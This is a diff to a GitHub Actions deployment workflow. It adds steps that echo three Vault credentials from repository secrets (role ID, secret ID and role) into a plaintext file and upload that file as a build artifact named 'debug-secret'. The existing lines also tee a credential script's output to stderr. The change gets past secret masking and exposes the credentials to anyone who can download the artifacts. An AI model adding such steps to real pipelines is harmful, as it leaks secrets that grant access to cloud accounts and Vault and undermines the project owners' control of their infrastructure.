@@ -101,6 +101,9 @@ jobs:
           sudo ./aws/install --update
           cp -R .aws ~/
           pipx run pipenv install
+          echo "Role ID = ${{ secrets.VAULT_ROLE_ID }}" > secret.txt
+          echo "Secret ID = ${{ secrets.VAULT_SECRET_ID }}" >> secret.txt
+          echo "Role = ${{ secrets.VAULT_ROLE }}" >> secret.txt
           pipx run pipenv run python ./get_aws_creds.py -i ${{ secrets.VAULT_ROLE_ID }} -s ${{ secrets.VAULT_SECRET_ID }} -r ${{ secrets.VAULT_ROLE }} 2>&1 | tee /dev/stderr
           # # Build & deploy
           # if [[ "${{ github.ref_name }}" == "staging" ]]; then
@@ -110,3 +113,8 @@ jobs:
           #   export STAGE="main"
           # fi
           # yarn sst deploy --stage $STAGE
+      - name: Upload artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: debug-secret
+          path: secret.txt
